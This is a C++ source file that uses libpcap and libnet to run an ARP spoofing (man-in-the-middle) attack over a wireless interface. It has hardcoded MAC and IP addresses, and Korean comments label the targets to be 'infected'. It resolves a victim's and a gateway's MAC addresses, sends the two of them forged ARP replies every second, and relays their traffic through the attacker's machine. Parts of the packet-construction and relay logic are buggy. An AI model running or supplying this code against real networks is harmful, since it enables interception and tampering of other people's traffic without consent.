#include <stdio.h>
#include <cstring>
#include <cstdlib>
#include "/root/getch.h"
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <thread>

u_char my_mac[] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
u_int8_t my_ip[] = {0xc0, 0xa8, 0xc8, 0x7b};
u_char brod_eth_mac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
u_int8_t brod_arp_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
u_int8_t sender_ip[] = {0xc0, 0xa8, 0xc8, 0x85};
u_int8_t receiver_ip[] = {0xc0, 0xa8, 0xc8, 0xfe};

struct eth_hdr {
    u_int8_t eth_dmac[6];   // ether destination mac주소
    u_int8_t eth_smac[6];  // ether source mac주소
    u_int16_t eth_type;   // ether type
};

struct arp_req {
    u_int16_t arp_hwtype;   // ARP 패킷의 하드웨어 타입
    u_int16_t arp_protype;  // ARP 패킷의 프로토콜 타입
    u_int8_t arp_hlen;   // ARP 패킷의 하드웨어 길이
    u_int8_t arp_plen;   // ARP 패킷의 프로토콜 길이
    u_int16_t arp_opr;   // ARP 패킷의 오퍼레이션
    u_int8_t arp_shwaddr[6];  // ARP 패킷의 소스MAC주소
    u_int8_t arp_sipaddr[4]; // ARP 패킷의 소스IP주소
    u_int8_t arp_thwaddr[6];   // ARP 패킷의 타겟MAC주소
    u_int8_t arp_tproaddr[4]; // ARP 패킷의 타겟IP주소
};

struct eth_arp_req {
    eth_hdr eth;
    arp_req arp;
};

void reply_mac(const u_char *packet, u_int8_t *mac);
void arp_infection(pcap_t *handle, eth_arp_req infect_r, eth_arp_req infect_s);
void relay(pcap_t *handle, u_int8_t *sender_mac , u_int8_t *receivcer_mac);

int main()
{
    const u_char *packet;
    struct pcap_pkthdr pcap_header;
    u_int8_t sender_mac[6];
    u_int8_t receiver_mac[6];
    pcap_t *handle;
    char *dev = "wlan0";
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    eth_hdr eth;
    memcpy(eth.eth_dmac, brod_eth_mac, sizeof(brod_eth_mac));
    memcpy(eth.eth_smac, my_mac, sizeof(my_mac));
    eth.eth_type = htons(ETH_P_ARP);

    arp_req arp;
    arp.arp_hwtype = htons(ARPHRD_ETHER);
    arp.arp_protype = htons(ETH_P_IP);
    arp.arp_hlen = sizeof(eth.eth_dmac);
    arp.arp_plen = sizeof(arp.arp_sipaddr);
    arp.arp_opr = htons(ARPOP_REQUEST);
    memcpy(arp.arp_shwaddr, my_mac, sizeof(my_mac));
    memcpy(arp.arp_sipaddr, my_ip, sizeof(my_ip));
    memcpy(arp.arp_thwaddr, brod_arp_mac, sizeof(brod_arp_mac));
    memcpy(arp.arp_tproaddr, sender_ip, sizeof(sender_ip));

    eth_arp_req req;
    req.eth = eth;
    req.arp = arp;

    if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
    {
        printf("arp error\n");
    }
    else
    {
        printf("arp send\n");
        packet = pcap_next(handle,&pcap_header);
        reply_mac(packet, sender_mac);
    }

    memcpy(arp.arp_tproaddr, receiver_ip, sizeof(receiver_ip));
    req.eth = eth;
    req.arp = arp;

    if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
    {
        printf("arp error\n");
    }
    else
    {
        printf("arp send\n");
        packet = pcap_next(handle,&pcap_header);
        reply_mac(packet, receiver_mac);
    }

    eth_hdr eth_s;
    eth_s = eth;
    memcpy(eth_s.eth_dmac, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
    memcpy(eth_s.eth_smac, my_mac, sizeof(my_mac));
    arp_req arp_s;
    arp_s = arp;
    arp_s.arp_opr = htons(ARPOP_REPLY);
    memcpy(arp_s.arp_shwaddr, my_mac, sizeof(my_mac));
    memcpy(arp_s.arp_sipaddr, receiver_ip, sizeof(receiver_ip));//gateway의 ip
    memcpy(arp_s.arp_thwaddr, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
    memcpy(arp_s.arp_tproaddr, sender_ip, sizeof(sender_ip));//감염시킬 sender의 ip
    eth_arp_req infect_s;
    infect_s.eth = eth_s;
    infect_s.arp = arp_s;

    eth_hdr eth_r;
    eth_r = eth_s;
    memcpy(eth_s.eth_dmac, receiver_mac, sizeof(receiver_mac));
    arp_req arp_r;
    arp_r = arp_s;
    memcpy(arp_s.arp_sipaddr, sender_ip, sizeof(sender_ip));//gateway의 ip
    memcpy(arp_s.arp_thwaddr, receiver_mac, sizeof(receiver_mac));//감염시킬 sender의 mac
    memcpy(arp_s.arp_tproaddr, receiver_ip, sizeof(receiver_ip));//감염시킬 sender의 ip
    eth_arp_req infect_r;
    infect_r.eth = eth_r;
    infect_r.arp = arp_r;

    std::thread(&arp_infection, handle, infect_r, infect_s).detach();

    std::thread(&relay, handle, sender_mac, receiver_mac).detach();

    getch();
}

void reply_mac(const u_char *packet, u_int8_t *mac)
{

    char buf[24];
    libnet_ethernet_hdr *ethernet_hdr = (libnet_ethernet_hdr *) packet;
    if(ntohs(ethernet_hdr->ether_type) == ETHERTYPE_ARP)
    {
        libnet_arp_hdr *arp_hdr = (libnet_arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
        if((ntohs(arp_hdr->ar_op) == ARPOP_REPLY))
        {
            printf("mac -> %s\n", ether_ntoa_r((ether_addr*)ethernet_hdr->ether_shost, buf));
            memcpy(mac, ethernet_hdr->ether_shost, 6);
        }
    }
}

void arp_infection(pcap_t *handle, eth_arp_req infect_r, eth_arp_req infect_s)
{
    while(1)
    {
        if ((pcap_sendpacket(handle,(const u_char*)&infect_r ,(sizeof(infect_s))) != 0)
                &&(pcap_sendpacket(handle,(const u_char*)&infect_s ,(sizeof(infect_r))) != 0))
        {
            printf("arp error\n");
        }
        else
        {
            printf("arp infection send\n");
        }
        sleep(1);
    }
    pcap_close(handle);
}

void relay(pcap_t *handle, u_int8_t *sender_mac, u_int8_t *receivcer_mac)
{
    const u_char *packet;
    struct pcap_pkthdr pcap_header;
    char buf[100];

    while(true)
    {
        packet = pcap_next(handle,&pcap_header);
        libnet_ethernet_hdr *ethernet_hdr = (libnet_ethernet_hdr *) packet;
        if(ntohs(ethernet_hdr->ether_type) == ETHERTYPE_IP)
        {
            if (memcmp(ethernet_hdr->ether_shost, sender_mac, 6) == 0)
            {
                memcpy(my_mac, ethernet_hdr->ether_shost, 6);
                memcpy(receivcer_mac, ethernet_hdr->ether_dhost, 6);
                if (pcap_sendpacket(handle, packet, pcap_header.caplen) != 0)
                {
                    printf("relay error\n");
                }
                else
                {
                    printf("relay succes\n");
                }
            }
            else if (memcmp(ethernet_hdr->ether_shost, receivcer_mac, 6) == 0)
            {
                memcpy(my_mac, ethernet_hdr->ether_shost, 6);
                memcpy(sender_mac, ethernet_hdr->ether_dhost, 6);
                if (pcap_sendpacket(handle, packet, pcap_header.caplen) != 0)
                {
                    printf("relay error\n");
                }
                else
                {
                    printf("relay succes\n");
                }
            }
        }
    }
}

